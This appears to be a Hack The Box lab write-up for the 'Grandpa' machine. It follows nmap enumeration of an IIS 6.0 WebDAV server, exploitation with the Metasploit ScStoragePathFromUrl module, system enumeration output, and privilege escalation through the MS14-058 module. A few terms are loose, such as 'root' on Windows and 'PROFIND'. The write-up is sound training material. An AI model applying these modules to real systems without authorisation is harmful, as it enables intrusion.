# Grandpa
Date: 2024/06/26

## Enumeration
### Port Scanning
I performed a port scan using the following command:

```bash
nmap -sS -sV -sC -p80 -v -oN v_ports.txt -oX v_ports.xml <IP>
```

The results revealed the following information:

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-title: Under Construction
|_http-server-header: Microsoft-IIS/6.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Date: Wed, 26 Jun 2024 04:24:01 GMT
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Server Type: Microsoft-IIS/6.0
|_  WebDAV type: Unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Port 80 Analysis
#### Vulnerability Search
I searched for vulnerabilities related to IIS 6.0 and found several potential exploits using searchsploit:

```bash
searchsploit iis 6.0
Notable findings included:

Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass
```

## Exploitation
I gained access using the following Metasploit exploit:

```bash
use exploit/windows/iis/iis_webdav_scstoragepathfromurl
```

This vulnerability takes advantages from the PROFIND method, part of the WebDAV protocol, is supported by IIS 6.0 and can be exploited for remote code execution. This vulnerability arises due to improper handling of HTTP requests by IIS, allowing attackers to send malicious requests and execute arbitrary code on the server. Exploiting this involves crafting special HTTP requests that exploit the vulnerability in the PROFIND method.

## Post Exploitation
### Privilege and User Enumeration
After gaining initial access, I ran several commands to enumerate users and system information.

```cmd
whoami /all

USER INFORMATION
----------------

User Name                    SID     
============================ ========
nt authority\network service S-1-5-20

GROUP INFORMATION
-----------------

Group Name                       Type             SID                                            Attributes                                        
================================ ================ ============================================== ==================================================
NT AUTHORITY\NETWORK SERVICE     User             S-1-5-20                                       Mandatory group, Enabled by default, Enabled group
Everyone                         Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
GRANPA\IIS_WPG                   Alias            S-1-5-21-1709780765-3897210020-3926566182-1005 Mandatory group, Enabled by default, Enabled group
BUILTIN\Performance Log Users    Alias            S-1-5-32-559                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                    Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE             Well-known group S-1-5-6                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization   Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
LOCAL                            Well-known group S-1-2-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                    Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

User enumeration:

```
net user

User accounts for \\GRANPA

-------------------------------------------------------------------------------
Administrator            ASPNET                   Guest                    
Harry                    IUSR_GRANPA              IWAM_GRANPA              
SUPPORT_388945a0         
System Information
```

System enumeration:

```
systeminfo

Host Name:                 GRANPA
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Uniprocessor Free
Registered Owner:          HTB
Registered Organization:   HTB
Product ID:                69712-296-0024942-44782
Original Install Date:     4/12/2017, 5:07:40 PM
System Up Time:            0 Days, 0 Hours, 41 Minutes, 33 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x86 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz
BIOS Version:              INTEL  - 6040000
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
Total Physical Memory:     1,023 MB
Available Physical Memory: 757 MB
Page File: Max Size:       2,470 MB
Page File: Available:      2,295 MB
Page File: In Use:         175 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: Q147222
Network Card(s):           N/A
```

### Privilege Escalation
I performed the module `use post/multi/recon/local_exploit_suggester` and I got several possible modules:

```
exploit/windows/local/ms10_015_kitrap0d
exploit/windows/local/ms14_058_track_popup_menu
exploit/windows/local/ms14_070_tcpip_ioctl
exploit/windows/local/ms15_051_client_copy_image
exploit/windows/local/ms16_016_webdav
exploit/windows/local/ppr_flatten_rec
```

After migrating to a more stable process, I used the `exploit/windows/local/ms14_058_track_popup_menu` module to elevate privileges, successfully obtaining **root** access and capturing the flags.

The MS14-058 vulnerability allows attackers to gain elevated privileges by exploiting a flaw in the Windows kernel. This vulnerability affects the handling of track popup menus and can be exploited to execute arbitrary code in kernel mode, leading to privilege escalation.

***
